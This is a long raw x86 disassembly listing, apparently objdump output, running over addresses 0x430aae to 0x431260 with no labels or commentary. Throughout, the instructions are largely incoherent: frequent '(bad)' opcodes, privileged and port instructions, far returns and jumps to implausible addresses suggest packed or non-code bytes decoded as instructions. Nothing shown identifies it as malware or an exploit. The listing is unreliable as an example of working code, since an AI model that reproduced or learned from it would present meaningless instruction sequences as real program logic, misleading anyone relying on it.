  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
